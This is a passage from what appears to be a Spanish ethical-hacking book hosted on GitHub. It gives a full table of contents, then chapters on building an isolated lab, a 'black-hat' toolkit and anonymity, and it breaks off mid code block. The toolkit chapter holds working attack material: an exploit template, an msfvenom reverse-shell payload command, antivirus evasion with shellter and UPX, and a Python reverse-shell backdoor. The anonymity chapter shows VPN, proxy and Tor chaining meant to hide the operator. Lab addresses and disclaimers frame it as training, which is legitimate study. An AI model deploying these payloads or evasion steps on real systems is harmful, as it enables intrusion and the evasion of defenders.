<a href="https://www.youtube.com/@AlekseiArdilla">![imagen de portada Github](La_biblia_negra_del_Ethical_Hacking_PORTADA.jpg)</a>

## üìö √çndice Detallado

**La Biblia Negra del Ethical Hacking**
*T√°cticas ocultas de hackers, no apto para card√≠acos* por **Alejandro G Vera**

---
### Pr√≥logo
* Advertencia y responsabilidad legal
* Filosof√≠a del hacker ofensivo
* Lo que no encontrar√°s en este libro
* La delgada l√≠nea entre lo √©tico y lo ilegal

### Cap√≠tulo 1 ‚Äì Entornos de Guerra Digital
* Montando laboratorios aislados para pruebas ofensivas extremas
* Principios del Laboratorio de Hacking √âtico
* Componentes Necesarios
* Preparando la Infraestructura
* Desplegando M√°quinas Virtuales
* Simulando una Empresa Real
* Seguridad del Laboratorio
* Ejemplo de Escenario Completo
* Ejercicio Pr√°ctico - Comprobando la Red
* Pr√≥ximos Pasos

### Cap√≠tulo 2 ‚Äì Sistema de Herramientas Black-Hat
* Compilaci√≥n, personalizaci√≥n y ocultamiento de utilidades ofensivas
* Clasificaci√≥n del Arsenal Black-Hat
* Compilando Herramientas desde el C√≥digo Fuente
* Modificando Exploits P√∫blicos
* Creaci√≥n de Payloads Personalizados con msfvenom
* Ofuscaci√≥n y Evasi√≥n de Antivirus
* Scripts Portables para Ataques R√°pidos
* Gesti√≥n del Arsenal
* Ejercicio Pr√°ctico - Kit de Ataque Express
* Cierre

### Cap√≠tulo 3 ‚Äì Anonimato y Clandestinidad Digital
* Ocultando tu rastro y movi√©ndote como un fantasma en la red
* Fundamentos del anonimato
* Infraestructura b√°sica de anonimato
* Uso de VPNs Multi-Hop
* Cadenas de Proxys
* Tor como Capa Extra
* T√∫neles SSH Inversos
* Fingerprinting y Defensa
* Entornos Burner (desechables)
* Ejercicio Pr√°ctico - Capa triple de anonimato
* Precauciones Finales

### Cap√≠tulo 4 ‚Äì Reconocimiento Agresivo y Subterr√°neo
* Mapeando el terreno antes del ataque y recolectando datos como un cazador digital
* Tipos de Reconocimiento
* Reconocimiento Pasivo - OSINT Extremo
* Escaneo Activo - Mapeo de la Red
* Fingerprinting de Servicios
* Recolecci√≥n de Subdominios
* Escaneo de Vulnerabilidades en Web
* Reconocimiento Subterr√°neo - Fuentes Filtradas
* Uso de Shodan para loT y Servicios Expuestos
* Combinaci√≥n de Datos
* Ejercicio Pr√°ctico - Recon total de un objetivo en laboratorio
* Seguridad del Reconocimiento
* Cierre

### Cap√≠tulo 5 ‚Äì Explotaci√≥n de Vulnerabilidades de Cero D√≠as (Zero-Day)
* El arte de atacar antes de que el mundo sepa que la falla existe
* Ciclo de vida de un Zero-Day
* T√©cnicas para Descubrir Zero-Days en Laboratorio
* Creaci√≥n de Exploits para 0-Day (Laboratorio)
* Simulaci√≥n de un 0-Day en un Servicio Web Vulnerable
* Encadenando 0-Day con Post-Explotaci√≥n
* Ejemplo Completo de Laboratorio
* Defensa contra 0-Day
* Cierre

### Cap√≠tulo 6 ‚Äì Ataques de Ingenier√≠a Social de Alto Impacto
* Rompiendo la seguridad t√©cnica a trav√©s de las debilidades humanas
* Principios de la Ingenier√≠a Social
* Tipos Comunes de Ataques
* Montando un Laboratorio de Ingenier√≠a Social
* Ejemplo 1 - Campa√±a de Phishing Controlado
* Ejemplo 2 - Vishing (Simulaci√≥n Telef√≥nica)
* Ejemplo 3 - Smishing
* Ejemplo 4 - Baiting con Dispositivo USB
* Ejemplo 5 - Pretexting Avanzado
* Medidas Defensivas
* Ejercicio Pr√°ctico - Simulaci√≥n Completa
* Cierre

### Cap√≠tulo 7 ‚Äì Pentesting Extremo
* Llevando las pruebas de penetraci√≥n al l√≠mite en entornos controlados
* Metodolog√≠a de Pentesting Extremo
* Configuraci√≥n de Laboratorio
* Reconocimiento Agresivo
* Explotaci√≥n Encadenada
* Escalada de Privilegios Creativa
* Movimiento Lateral Masivo
* Persistencia Multi-Capa
* Ataques Destructivos en Laboratorio
* Ejercicio Pr√°ctico Completo
* Cierre

### Cap√≠tulo 8 - Escalada de Privilegios Creativa
* Transformando accesos limitados en control absoluto del sistema
* Tipos de Escalada
* Escalada en Windows
* Escalada en Linux
* Escalada en entornos mixtos
* Creatividad en la Escalada
* Ejercicio Pr√°ctico Completo
* Medidas Defensivas
* Cierre

### Cap√≠tulo 9 ‚Äì Carding: Anatom√≠a y Simulaci√≥n en Laboratorio
* Destripando el fraude con tarjetas para comprenderlo y prevenirlo
* Anatom√≠a de una Tarjeta
* Generaci√≥n de Datos Simulados
* Escenario de Laboratorio
* Skimming en Laboratorio
* Captura en Tr√°nsito (Man-in-the-Middle)
* Validaci√≥n de BIN y Luhn Check
* Clonaci√≥n Simulada
* Uso Fraudulento Simulado
* Detecci√≥n y Prevenci√≥n
* Ejercicio Pr√°ctico Completo
* Cierre

### Cap√≠tulo 10 ‚Äì Mercados Negros y Transacciones An√≥nimas
* C√≥mo operan las econom√≠as clandestinas digitales y c√≥mo simularlas en un entorno seguro
* Componentes de un Mercado Negro Digital
* Simulaci√≥n de un Mercado Negro en Laboratorio
* Acceso a trav√©s de Tor
* Transacciones con Criptomonedas de Prueba
* Uso de Monero en Laboratorio
* Sistema de Escrow Simulado
* Seguridad del Mercado
* An√°lisis Forense de un Mercado Negro Simulado
* Ejercicio Pr√°ctico Completo
* Riesgos Reales y Contramedidas
* Cierre

### Cap√≠tulo 11 ‚Äì Hombre en el Medio (MitM) al L√≠mite
* Interceptando, manipulando y explotando el tr√°fico como un depredador digital invisible
* Tipos de MitM
* Montando el Laboratorio
* ARP Spoofing con Ettercap
* DNS Spoofing
* Manipulaci√≥n de HTTP
* SSL Strip - Downgrade de HTTPS
* Intercepci√≥n con mitmproxy
* Inyecci√≥n de Scripts en Descargas
* Captura de Credenciales
* Ejercicio Pr√°ctico Completo
* Detecci√≥n y Contramedidas
* Cierre

### Cap√≠tulo 12 - DoS y DDoS de Nivel Militar
* C√≥mo saturar sistemas al punto de dejarlos sin aliento... y c√≥mo defenderse de ello
* Clasificaci√≥n de Ataques
* Laboratorio de Pruebas
* Ataques Volum√©tricos
* Ataques de Protocolo
* Ataques a Nivel de Aplicaci√≥n
* Simulaci√≥n de DDOS
* Medici√≥n de Impacto
* Defensas contra DoS/DDoS
* Ejercicio Pr√°ctico Completo
* Cierre

### Cap√≠tulo 13 ‚Äì Web Hacking sin Piedad
* Tomando el control total de aplicaciones y servidores web sin dejar piedra sobre piedra
* Principales Vectores de Ataque
* Preparando el Laboratorio
* SQL Injection (SQLi)
* Cross-Site Scripting (XSS)
* Command Injection
* File Upload Vulnerability
* Path Traversal
* Enumeraci√≥n de Directorios y Archivos
* Escalada desde Web Shell a Control Total
* Automatizaci√≥n de Ataques
* Ejercicio Pr√°ctico Completo
* Contramedidas
* Cierre

### Cap√≠tulo 14 ‚Äì Wireless Hacking Avanzado
* Rompiendo la seguridad de redes inal√°mbricas modernas con precisi√≥n quir√∫rgica
* Herramientas y Hardware
* Configuraci√≥n del Laboratorio
* Captura de Handshake WPA/WPA2
* Crackeo de Contrase√±a
* Ataques Evil Twin
* WPA3 Cracking con Downgrade
* Ataques WPS
* Rogue AP + Captura de Credenciales
* Ejercicio Pr√°ctico Completo
* Medidas Defensivas
* Cierre

### Cap√≠tulo 15 ‚Äì Hacking con Dispositivos M√≥viles
* Transformando smartphones en armas digitales y objetivos de alto valor
* Escenarios de Ataque y Uso Ofensivo
* Hacking con Android
* Hacking con iOS
* Comprometiendo Dispositivos Android
* Comprometiendo Dispositivos iOS
* Ataques v√≠a Ingenier√≠a Social
* Ataques v√≠a Red
* Persistencia en M√≥viles
* Ejercicio Pr√°ctico Completo
* Medidas Defensivas
* Cierre

### Cap√≠tulo 16 ‚Äì Clonaci√≥n de SIM y Ataques IMSI Catcher
* Interceptando y manipulando la identidad m√≥vil como un operador encubierto
* Anatom√≠a de una Tarjeta SIM
* Hardware y Software Necesario
* Extracci√≥n de Datos de SIM
* Clonaci√≥n de SIM en Blanco
* Introducci√≥n a IMSI Catchers
* Montando un IMSI Catcher de Laboratorio
* Ataques con IMSI Catcher
* Ejercicio Pr√°ctico Completo
* Contramedidas
* Cierre

### Cap√≠tulo 17 ‚Äì Control Remoto de Dispositivos M√≥viles (Android e iOS)
* Tomando el mando de un smartphone como si estuvieras en sus propios dedos
* Escenarios de Uso en Laboratorio
* Control Remoto en Android
* Control Remoto en iOS
* Persistencia en Dispositivos M√≥viles
* Exfiltraci√≥n de Datos
* Ataques v√≠a Ingenier√≠a Social
* Ejercicio Pr√°ctico Completo
* Contramedidas
* Cierre

### Cap√≠tulo 18 ‚Äì Android como Plataforma de Ataque
* Convertir un smartphone en un kit ofensivo port√°til y aut√≥nomo
* Preparaci√≥n del Entorno
* Instalando Kali NetHunter
* Uso de Termux para Hacking
* Escaneo de Redes desde Android
* Hacking Wi-Fi desde Android
* Ataques Web desde Android
* Integraci√≥n de SDR para Capturas de Radiofrecuencia
* Uso de Android como Servidor C2 (Comando y Control)
* Ejercicio Pr√°ctico Completo
* Ventajas y Limitaciones
* Medidas Defensivas
* Cierre

### Cap√≠tulo 19 - Clonaci√≥n de SIM: Escenarios Avanzados
* Operaciones combinadas y persistencia en identidad m√≥vil para entornos controlados
* Escenarios de Laboratorio Avanzados
* Hardware y Software
* Clonaci√≥n con Persistencia
* Clonaci√≥n + IMSI Catcher
* Clonaci√≥n Rotativa
* Ejemplo Completo de Laboratorio
* Uso de SDR para An√°lisis de Tr√°fico
* Contramedidas Avanzadas
* Ejercicio Pr√°ctico Completo
* Cierre

### Cap√≠tulo 20 ‚Äì Hombre en el Medio en Redes M√≥viles
* Interceptando y manipulando comunicaciones celulares en entornos controlados
* Principios del MitM Celular
* Requisitos del Laboratorio
* Montando la BTS Falsa
* Captura de IMSI y Autenticaci√≥n
* Downgrade de Cifrado
* Interceptando Tr√°fico
* Manipulaci√≥n de Tr√°fico
* MitM LTE y 5G
* Ejercicio Pr√°ctico Completo
* Contramedidas
* Cierre

### Cap√≠tulo 21 - Rootkits Invisibles
* Control absoluto y sigiloso del sistema operativo
* Tipos de Rootkits
* Entorno de Laboratorio
* Rootkit en Modo Usuario (Ejemplo en Python)
* Rootkit en Modo Kernel (Linux)
* Ocultando Procesos
* Rootkit en Windows (Hooking DLL)
* Persistencia
* Ejercicio Pr√°ctico Completo
* Detecci√≥n y Eliminaci√≥n
* Cierre

### Cap√≠tulo 22 ‚Äì Malware Fileless
* El arte de atacar sin dejar huellas en disco
* Caracter√≠sticas Clave
* Entorno de Laboratorio
* Ejemplo de Ataque Fileless con PowerShell
* Fileless usando WMI (Windows Management Instrumentation)
* Fileless en Linux (Bash + /dev/shm)
* T√©cnicas de Entrega
* Ejercicio Pr√°ctico Completo
* Detecci√≥n
* Contramedidas
* Cierre

### Cap√≠tulo 23 ‚Äì Keyloggers Indetectables
* La captura silenciosa de cada pulsaci√≥n
* Tipos de Keyloggers
* Entorno de Laboratorio
* Keylogger en Python (Windows)
* Keylogger en Linux (C+X11)
* Keylogger en Modo Kernel (Linux)
* Persistencia Sigilosa
* Exfiltraci√≥n de Datos
* Ejercicio Pr√°ctico Completo
* Detecci√≥n y Mitigaci√≥n
* Cierre

### Cap√≠tulo 24 ‚Äì Ataques a Cadenas de Suministro (Supply Chain Attacks)
* Comprometiendo el software y hardware antes de que llegue a su destino
* Tipos de Ataques de Cadena de Suministro
* Escenario de Laboratorio - Software
* Escenario de Laboratorio - Hardware
* Escenario de Laboratorio - Inyecci√≥n en Pipeline CI/CD
* Ejemplo Completo de Backdoor en Librer√≠a NPM
* Persistencia y Evasi√≥n
* Ejercicio Pr√°ctico Completo
* Detecci√≥n
* Contramedidas
* Cierre

### Cap√≠tulo 25 ‚Äì Exfiltraci√≥n de Datos Encubierta
* Sacando informaci√≥n sin levantar alarmas
* Preparaci√≥n del Laboratorio
* Proceso General de Exfiltraci√≥n
* M√©todo 1 - Exfiltraci√≥n v√≠a HTTP(S)
* M√©todo 2 - DNS Tunneling
* M√©todo 3 - ICMP (Ping) Tunneling
* M√©todo 4 - Esteganograf√≠a
* M√©todo 5 - Canales en Servicios Cloud
* Ejercicio Pr√°ctico Completo
* Detecci√≥n
* Contramedidas
* Cierre

### Cap√≠tulo 26 ‚Äì Hacking F√≠sico y Seguridad de Acceso
* Comprometiendo el mundo f√≠sico para abrir puertas digitales
* Tipos de Objetivos en Hacking F√≠sico
* Herramientas B√°sicas de Laboratorio
* Ataques a Cerraduras Mec√°nicas
* Ataques a Cerraduras Electr√≥nicas RFID/NFC
* Ataques a Sistemas de Teclado Num√©rico
* Ataques a Sistemas Biom√©tricos
* Ataques a Dispositivos Desatendidos
* Ejemplo Completo de Laboratorio - Clonaci√≥n RFID
* Persistencia F√≠sica
* Detecci√≥n y Contramedidas
* Cierre

### Cap√≠tulo 27 ‚Äì Ingenier√≠a Social Avanzada
* El arte de hackear la mente antes de hackear el sistema
* Principios Psicol√≥gicos Fundamentales
* Preparaci√≥n de un Ataque de Ingenier√≠a Social
* Ejemplo de OSINT Automatizado
* T√©cnicas de Ingenier√≠a Social Avanzada
* Escenario de Laboratorio - Spear Phishing
* Escenario de Laboratorio - Pretexting Telef√≥nico
* Ejercicio Pr√°ctico Completo
* Detecci√≥n y Prevenci√≥n
* Cierre

### Cap√≠tulo 28 ‚Äì OSINT Avanzado
* Inteligencia de fuentes abiertas para la caza digital
* Ciclo de OSINT
* Fuentes de OSINT
* Herramientas de OSINT Avanzado
* Ejemplo de B√∫squeda Avanzada en Google (Google Dorks)
* Ejemplo con theHarvester
* Ejemplo con Shodan
* OSINT en Redes Sociales
* Extracci√≥n de Metadatos
* Ejercicio Pr√°ctico Completo
* Detecci√≥n y Prevenci√≥n
* Cierre

### Cap√≠tulo 29 ‚Äì Cierre, Despedida y Declaraci√≥n Final
* Reflexiones finales, responsabilidad y el verdadero sentido del hacking √©tico
* El viaje que hemos hecho juntos
* El prop√≥sito de este libro
* Importancia del laboratorio controlado
* Declaraci√≥n y responsabilidad legal
* Hacking √©tico vs. hacking criminal
* La mentalidad correcta
* Recomendaciones para seguir aprendiendo
* El lado humano de la ciberseguridad
* Mensaje final del autor
* DISCLAIMER EXTENDIDO

### Ep√≠logo
* Para quienes caminan entre la luz y la sombra

---
## **Pr√≥logo**

**La Biblia Negra del Ethical Hacking**
*T√°cticas ocultas de hackers, no apto para card√≠acos*

---

### **Advertencia y responsabilidad legal**

Antes de abrir este libro, debes comprender que la informaci√≥n aqu√≠ expuesta tiene un car√°cter **educativo y formativo**. No es un manual para cometer delitos, sino un compendio t√©cnico para que un profesional pueda entender, reproducir en un entorno controlado y aprender las t√©cnicas que los atacantes reales utilizan. Aplicar estos conocimientos en sistemas o redes sin autorizaci√≥n expresa es **ilegal** en la mayor√≠a de los pa√≠ses y puede conllevar sanciones penales severas.
Este libro asume que t√∫, lector, eres un profesional o aspirante a profesional de la ciberseguridad con un alto sentido √©tico, dispuesto a aplicar estas t√©cnicas **√∫nicamente en entornos autorizados y con fines de defensa**.

‚ö† **DISCLAIMER**:
El autor y el editor no se hacen responsables del uso indebido de la informaci√≥n aqu√≠ contenida. Toda pr√°ctica debe realizarse en entornos de laboratorio o sistemas bajo tu control y consentimiento expl√≠cito del propietario.

---

### **Filosof√≠a del hacker ofensivo**

En el mundo de la ciberseguridad, existe un punto en el que **conocer las defensas no es suficiente**: debes pensar como un atacante. El hacker ofensivo es un estratega que entiende el terreno digital mejor que sus adversarios, conoce las debilidades humanas y t√©cnicas, y aprovecha cualquier ventaja para lograr sus objetivos.
Pero la filosof√≠a del hacking ofensivo no es *destruir*; es **entender para proteger**. Los mejores hackers saben que el conocimiento se expande cuando se explora el lado oscuro, pero se usa para construir barreras m√°s s√≥lidas.

---

### **Lo que no encontrar√°s en este libro**

* **Recetas m√°gicas** para ‚Äúhackear‚Äù una cuenta de redes sociales en dos clics (esas mentiras que circulan por YouTube).
* **Contenido ilegal** como bases de datos robadas listas para usar o instrucciones para atacar sistemas reales sin permiso.
* **Informaci√≥n incompleta**: cada cap√≠tulo est√° escrito para que puedas reproducir un ataque desde cero en un laboratorio y entenderlo a nivel de bits.

---

### **La delgada l√≠nea entre lo √©tico y lo ilegal**

Un Ethical Hacker camina sobre una l√≠nea fina: de un lado est√° la investigaci√≥n leg√≠tima y autorizada; del otro, el delito. Esa l√≠nea muchas veces no es clara para quienes no conocen la ley o las pol√≠ticas internas de una organizaci√≥n.
Este libro te ense√±ar√° a **operar siempre del lado correcto**, pero usando t√©cnicas que los atacantes criminales tambi√©n emplean. Tu misi√≥n ser√° dominar el arte de la intrusi√≥n controlada, pero nunca cruzar la frontera hacia la intrusi√≥n criminal.

---

üí° **Ejemplo de entorno seguro para pruebas (Bash):**

```bash
# Crear una red virtual aislada con VirtualBox
VBoxManage natnetwork add --netname LabNet --network "192.168.50.0/24" --enable --dhcp on

# Crear dos m√°quinas virtuales: una v√≠ctima y un atacante
VBoxManage createvm --name "Victima" --register
VBoxManage createvm --name "Atacante" --register

# (Luego podr√°s instalar Kali Linux en la m√°quina atacante y una distro vulnerable como Metasploitable en la v√≠ctima)
```

# **Cap√≠tulo 1 ‚Äì Entornos de Guerra Digital**

*Montando laboratorios aislados para pruebas ofensivas extremas*

---

## 1.1. Introducci√≥n

Antes de ejecutar cualquier ataque, necesitas un **campo de batalla controlado**. No importa cu√°n h√°bil seas con las herramientas, si no tienes un entorno seguro y aislado, corres el riesgo de da√±ar redes reales o exponerte a acciones legales.
Este cap√≠tulo te ense√±ar√° a crear un **laboratorio de guerra digital** desde cero, replicando las condiciones de un entorno real pero sin afectar sistemas externos.

---

## 1.2. Principios del Laboratorio de Hacking √âtico

Un buen laboratorio debe:

* **Ser aislado de Internet real** para evitar fugas.
* **Simular redes corporativas** con m√∫ltiples segmentos (DMZ, LAN, VLAN).
* Permitir el despliegue r√°pido de sistemas vulnerables y herramientas ofensivas.
* Ser **repetible**, es decir, que puedas reconstruirlo si algo sale mal.

---

## 1.3. Componentes Necesarios

| Componente             | Descripci√≥n                                                                                     |
| ---------------------- | ----------------------------------------------------------------------------------------------- |
| **Hardware**           | PC o laptop con m√≠nimo 16GB RAM, CPU multin√∫cleo, 250GB de disco libre.                         |
| **Software base**      | VirtualBox, VMware Workstation o Proxmox (virtualizaci√≥n).                                      |
| **Sistemas de prueba** | Kali Linux (atacante), Metasploitable2, DVWA, OWASP Broken Web Apps, Windows Server vulnerable. |
| **Red virtual**        | NAT, Host-Only y adaptadores internos.                                                          |

---

## 1.4. Preparando la Infraestructura

Aqu√≠ configuraremos una **red virtual interna** donde coexistir√°n los sistemas de ataque y de defensa.

### Paso 1: Instalar VirtualBox (Ejemplo en Debian/Ubuntu)

```bash
sudo apt update && sudo apt install virtualbox virtualbox-ext-pack -y
```

### Paso 2: Crear la red Host-Only

```bash
VBoxManage hostonlyif create
VBoxManage hostonlyif ipconfig vboxnet0 --ip 192.168.56.1 --netmask 255.255.255.0
```

### Paso 3: Configurar el NAT para simular Internet interno

```bash
VBoxManage natnetwork add --netname LabNet --network "192.168.50.0/24" --enable --dhcp on
```

---

## 1.5. Desplegando M√°quinas Virtuales

### 1.5.1. M√°quina Atacante (Kali Linux)

* **CPU:** 2 n√∫cleos
* **RAM:** 4GB
* **Red:** Adaptador NAT + Host-Only (para comunicarse con las v√≠ctimas).

Ejemplo de instalaci√≥n automatizada:

```bash
VBoxManage createvm --name "Kali" --ostype "Debian_64" --register
VBoxManage modifyvm "Kali" --memory 4096 --cpus 2 --nic1 natnetwork --nat-network1 LabNet
VBoxManage modifyvm "Kali" --nic2 hostonly --hostonlyadapter2 vboxnet0
```

---

### 1.5.2. M√°quina V√≠ctima (Metasploitable 2)

* Sistema vulnerable intencionalmente.
* **Red:** Host-Only para aislarla de Internet.

```bash
VBoxManage createvm --name "Victima-MS2" --ostype "Ubuntu_64" --register
VBoxManage modifyvm "Victima-MS2" --memory 2048 --cpus 1 --nic1 hostonly --hostonlyadapter1 vboxnet0
```

---

### 1.5.3. Servidor Windows Vulnerable

√ötil para practicar explotaci√≥n de SMB, RDP, y Active Directory mal configurado.

---

## 1.6. Simulando una Empresa Real

Una red corporativa t√≠pica tiene:

* **LAN interna:** usuarios y PCs comunes.
* **DMZ:** servidores web, correo y VPN expuestos.
* **Servidor de logs y monitoreo.**

Podemos replicar esto con 3 redes virtuales:

1. **192.168.10.0/24** (LAN interna)
2. **192.168.20.0/24** (DMZ)
3. **192.168.30.0/24** (Administraci√≥n)

---

## 1.7. Seguridad del Laboratorio

* Bloquea la salida a Internet real en las m√°quinas v√≠ctimas.
* Usa snapshots antes y despu√©s de ataques para restaurar el estado.
* Documenta cada cambio en un **cuaderno de bit√°cora**.

---

## 1.8. Ejemplo de Escenario Completo

```plaintext
[Atacante: Kali Linux]
  ‚Üï  Host-Only Network  ‚Üï
[V√≠ctima 1: Metasploitable 2]
[V√≠ctima 2: Windows Server 2012 con SMBv1 habilitado]
[V√≠ctima 3: DVWA en Ubuntu Server]
```

---

## 1.9. Ejercicio Pr√°ctico ‚Äì Comprobando la Red

En Kali:

```bash
ip addr show
ping 192.168.56.101  # IP de la v√≠ctima
nmap -sP 192.168.56.0/24
```

---

## 1.10. Pr√≥ximos Pasos

Con este laboratorio montado, podr√°s practicar:

* Escaneo de puertos y servicios.
* Explotaci√≥n de vulnerabilidades.
* Persistencia y escalada de privilegios.

---

üí° **TIP:** Guarda un snapshot inicial llamado `Limpio` y uno posterior a cada ataque para evitar tener que reinstalar todo.

---


# **Cap√≠tulo 2 ‚Äì Sistema de Herramientas Black-Hat**

*Compilaci√≥n, personalizaci√≥n y ocultamiento de utilidades ofensivas*

---

## 2.1. Introducci√≥n

En el arsenal de un hacker ofensivo, las herramientas son como las armas de un soldado: no basta con tenerlas, hay que saber **c√≥mo fabricarlas, adaptarlas y esconderlas** para que funcionen de manera √≥ptima sin ser detectadas. Este cap√≠tulo no se limita a enumerar utilidades; vamos a construirlas, modificarlas y ajustarlas para maximizar su eficacia en un laboratorio de guerra digital.

> **Objetivo:** al final de este cap√≠tulo, tendr√°s un **kit Black-Hat personalizado**, con binarios ofuscados, scripts optimizados y un flujo de trabajo para desplegar ataques en cuesti√≥n de segundos.

---

## 2.2. Clasificaci√≥n del Arsenal Black-Hat

| Categor√≠a            | Herramientas                                      | Uso                                    |
| -------------------- | ------------------------------------------------- | -------------------------------------- |
| **Reconocimiento**   | `nmap`, `masscan`, `theHarvester`                 | Mapear redes y recolectar datos.       |
| **Explotaci√≥n**      | `metasploit`, `exploit-db`, `sqlmap`              | Aprovechar vulnerabilidades.           |
| **Post-explotaci√≥n** | `empire`, `Cobalt Strike`, `linpeas`, `mimikatz`  | Mantener acceso y escalar privilegios. |
| **Persistencia**     | `netcat`, backdoors en Python/Bash, DLL hijacking | Reingresar despu√©s de un reinicio.     |
| **Anti-forense**     | `shred`, `bleachbit`, timestomping                | Borrar huellas.                        |

---

## 2.3. Compilando Herramientas desde el C√≥digo Fuente

Los antivirus y EDRs detectan firmas conocidas en ejecutables populares. Una t√©cnica cl√°sica para evadir detecci√≥n es **compilar desde el c√≥digo fuente**, aplicando ligeros cambios.

### Ejemplo: Compilar Nmap desde cero (Linux)

```bash
sudo apt update && sudo apt install build-essential libssl-dev libpcap-dev -y
wget https://nmap.org/dist/nmap-7.94.tar.bz2
tar -xvjf nmap-7.94.tar.bz2
cd nmap-7.94
./configure
make
sudo make install
```

üí° **Ventaja:** tu binario no tendr√° la misma huella que el oficial.

---

## 2.4. Modificando Exploits P√∫blicos

Muchos exploits de `exploit-db` son detectados por antivirus porque su c√≥digo es conocido. Cambiar nombres de funciones, variables y cadenas de texto puede ayudar.

Ejemplo de modificaci√≥n en Python:

```python
# Original: https://www.exploit-db.com/exploits/12345
import socket

def pwn(target_ip, target_port):
    payload = b"\x90" * 100 + b"<shellcode>"
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target_ip, target_port))
    s.send(payload)
    s.close()

if __name__ == "__main__":
    pwn("192.168.56.101", 21)
```

* Cambia `"192.168.56.101"` por la IP de tu laboratorio.
* Sustituye `<shellcode>` por c√≥digo generado con `msfvenom`.

---

## 2.5. Creaci√≥n de Payloads Personalizados con msfvenom

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.56.10 LPORT=4444 -f exe -o backdoor.exe
```

Opciones clave:

* `-p`: payload a usar.
* `LHOST`: IP de tu m√°quina atacante.
* `LPORT`: puerto de escucha.
* `-f`: formato de salida (`exe`, `elf`, `py`, etc.).
* `-o`: nombre del archivo.

---

## 2.6. Ofuscaci√≥n y Evasi√≥n de Antivirus

### 2.6.1. Uso de `shellter`

`shellter` permite inyectar payloads en ejecutables leg√≠timos.

```bash
sudo apt install shellter
sudo shellter
# Selecciona modo autom√°tico, payload y ejecutable base (por ejemplo: calc.exe)
```

### 2.6.2. Empaquetar con `pyinstaller`

Si tienes un script en Python:

```bash
pyinstaller --onefile --noconsole script.py
```

Puedes luego modificar el binario con UPX para compresi√≥n y cambio de huella:

```bash
upx --best script
```

---

## 2.7. Scripts Portables para Ataques R√°pidos

Ejemplo de backdoor en Python:

```python
import socket,subprocess,os

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("192.168.56.10",4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/bash","-i"])
```

En el atacante:

```bash
nc -lvnp 4444
```

---

## 2.8. Gesti√≥n del Arsenal

Organiza las herramientas en carpetas:

```
/BlackHatKit
   /Recon
   /Exploitation
   /PostExploitation
   /Persistence
   /AntiForensic
```

Incluye un README con:

* Descripci√≥n de cada herramienta.
* Comando b√°sico de uso.
* Dependencias.

---

## 2.9. Ejercicio Pr√°ctico ‚Äì Kit de Ataque Express

1. Crea una VM con Kali Linux.
2. Instala `nmap`, `metasploit`, `sqlmap`, `netcat`.
3. Compila `nmap` desde c√≥digo.
4. Genera un payload `msfvenom` y ejec√∫talo en Metasploitable 2.
5. Documenta el flujo.

---

## 2.10. Cierre

Este cap√≠tulo te ha dado las bases para construir tu **arsenal Black-Hat**: no dependas solo de herramientas prehechas; enti√©ndelas, modif√≠calas y ad√°ptalas. La pr√≥xima vez que un antivirus intente detenerte en el laboratorio, tendr√°s c√≥mo evadirlo.

---


# **Cap√≠tulo 3 ‚Äì Anonimato y Clandestinidad Digital**

*Ocultando tu rastro y movi√©ndote como un fantasma en la red*

---

## 3.1. Introducci√≥n

En el hacking ofensivo, **no ser visto es tan importante como no dejar pruebas**. La mayor√≠a de atacantes caen porque subestiman la capacidad de rastreo: direcciones IP, huellas del navegador, patrones de tr√°fico y metadatos incriminatorios. Este cap√≠tulo te ense√±ar√° a **enmascararte digitalmente** para que tu actividad de laboratorio parezca provenir de cualquier parte‚Ä¶ excepto de ti.

> **Objetivo:** aprender√°s a encadenar proxys, usar VPNs multi-hop, montar t√∫neles SSH inversos, manipular tu fingerprint digital y configurar entornos ‚Äúburner‚Äù (desechables).

---

## 3.2. Fundamentos del anonimato

Para que el anonimato funcione:

* **Separaci√≥n total** de identidad real y digital falsa.
* **Aislamiento f√≠sico** (hardware dedicado).
* **Evasi√≥n de huellas** (software, tr√°fico, horarios de conexi√≥n).
* **Destrucci√≥n segura** de cualquier rastro cuando termines.

---

## 3.3. Infraestructura b√°sica de anonimato

| Capa                  | T√©cnica                          | Ejemplo                               |
| --------------------- | -------------------------------- | ------------------------------------- |
| **IP Layer**          | VPN, Tor, Proxy encadenado       | NordVPN ‚Üí Tor ‚Üí Proxy privado         |
| **Transport Layer**   | SSH tunneling, VPN dentro de VPN | `ssh -D 9050 user@host`               |
| **Application Layer** | Navegadores seguros, aislados    | Firefox ESR con plugins de privacidad |
| **Hardware Layer**    | M√°quinas desechables             | Laptop usada solo para laboratorio    |

---

## 3.4. Uso de VPNs Multi-Hop

Una VPN multi-hop enruta tu tr√°fico por varios servidores antes de salir a Internet, dificultando la trazabilidad.

### Ejemplo: OpenVPN multi-hop manual

```bash
# Primer salto (VPN 1)
sudo openvpn --config vpn1.ovpn &

# Encadenar con un segundo t√∫nel (VPN 2)
sudo openvpn --config vpn2.ovpn --route-nopull --route 0.0.0.0 0.0.0.0
```

üí° Combinar VPNs de distintos proveedores a√±ade capas legales en diferentes jurisdicciones.

---

## 3.5. Cadenas de Proxys

Un proxy encadenado distribuye tu conexi√≥n a trav√©s de m√∫ltiples nodos.

Ejemplo con `proxychains` en Kali:

```bash
sudo apt install proxychains4
nano /etc/proxychains4.conf
```

Configura:

```
strict_chain
proxy_dns
[ProxyList]
socks5 127.0.0.1 9050
socks4 203.0.113.10 1080
http   198.51.100.5 8080
```

Ejecuta:

```bash
proxychains nmap -sT scanme.nmap.org
```

---

## 3.6. Tor como Capa Extra

Tor en modo oculto:

```bash
sudo apt install tor
tor --RunAsDaemon 1
proxychains firefox
```

* Evita plugins que filtren IP real.
* Usa siempre HTTPS.

---

## 3.7. T√∫neles SSH Inversos

Permiten acceder a tu m√°quina detr√°s de NAT o firewall.

En el servidor remoto:

```bash
ssh -R 4444:localhost:22 user@remote_server
```

Desde el servidor remoto:

```bash
ssh -p 4444 user@localhost
```

üí° √ötil para control remoto sigiloso de entornos de laboratorio.

---

## 3.8. Fingerprinting y Defensa

Tu navegador y sistema exponen una ‚Äúhuella‚Äù √∫nica (user agent, fuentes, resoluci√≥n, etc.).

### Herramientas para verificar fingerprint:

```plaintext
https://amiunique.org
https://browserleaks.com
```

### Reducci√≥n de huella en Firefox:

* Desactivar WebGL y WebRTC.
* User-Agent rotatorio con `user-agent-switcher`.

---

## 3.9. Entornos Burner (desechables)

Un **entorno burner** es un sistema que:

* Se instala r√°pido.
* No guarda datos.
* Se destruye despu√©s de usarlo.

### Ejemplo con Tails OS

```bash
